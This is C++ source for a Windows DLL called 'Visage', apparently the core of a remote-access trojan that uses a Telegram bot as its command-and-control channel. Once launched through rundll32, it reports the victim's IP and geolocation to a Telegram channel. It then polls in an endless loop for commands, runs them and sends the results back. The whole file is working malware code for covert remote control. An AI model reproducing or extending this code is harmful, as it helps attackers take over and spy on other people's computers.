#include <Windows.h>
#include <iostream>
#include "common.h"

#define VISAGE_CHANNEL_ID "" //define channel id
#define VISAGE_BOT_TOKEN "" //define bot token
#define VISAGE_SLEEP_TIME 1000 //define sleep time

//main exported function in dll... If you want to try it, just use "rundll32.exe Visage.dll,VisageInit"
extern "C" void __declspec(dllexport) VisageInit()
{
#ifdef _DEBUG_
	mprintf("Starting");
#endif
	char buffer[MAX_PATH]; //store current directory for some reason or another
	GetCurrentDirectoryA(MAX_PATH,buffer);
	std::string ip = getlocalIPnGeoInfo(); //get internet ip
 	//form initiation message 
	std::string message = "<b>";
	message+=ip;
	message+=" Connected!!!</b>"; 
	//send message to channel
	TeleSendMessage(message.c_str(), VISAGE_BOT_TOKEN, VISAGE_CHANNEL_ID);
	//loopy loopy	
	while (1)
	{
		//get current offset
		int off = TeleGetCurrentOffset(VISAGE_BOT_TOKEN);
		//hold actual data
		std::string data;
		//get full json response
		std::string c = TeleUpdateMostRecent(VISAGE_BOT_TOKEN,off);
		//parse out command data
		data = TeleParseData(c);
		if (data.size() > 0) 
		{ //data sould be greater than 0
			//data is valid
			//handle command data
			std::string resp = ip;
			resp += ":";
			resp += TeleHandleCommand(data,ip);
			//send response 
			TeleSendMessage(resp.c_str(),VISAGE_BOT_TOKEN,VISAGE_CHANNEL_ID);
			//update the offset to avoid getting the same response...
			TeleUpdateMostRecent(VISAGE_BOT_TOKEN, off + 1); 
		}
		//Sleep for a given time
		Sleep(VISAGE_SLEEP_TIME);
	}
}